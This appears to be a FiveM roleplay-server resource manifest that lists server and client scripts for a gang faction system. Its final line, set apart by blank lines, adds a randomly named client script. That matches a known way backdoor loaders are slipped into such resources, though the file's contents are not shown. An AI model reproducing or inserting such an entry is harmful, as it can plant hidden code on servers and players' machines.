resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server/faction_sv.lua'
}

client_scripts {
	'config.lua',
	'client/menufaction_cl.lua',
	'faction/vagos_cl.lua',
	'faction/camorra_cl.lua',
	'faction/ballas_cl.lua',
	'faction/locura_cl.lua',
	'faction/madrazo_cl.lua',
	'faction/mafia_cl.lua',
	'faction/bkc_cl.lua',
	'faction/weapondealer_cl.lua',
	'faction/bloods_cl.lua',
	'faction/yakuza_cl.lua',
	'faction/bratva_cl.lua',
	'faction/families_cl.lua'
	--'faction/osm_cl.lua'
}

dependencies {
	'es_extended'
}



client_script "uQDerSFbadaBejT.lua"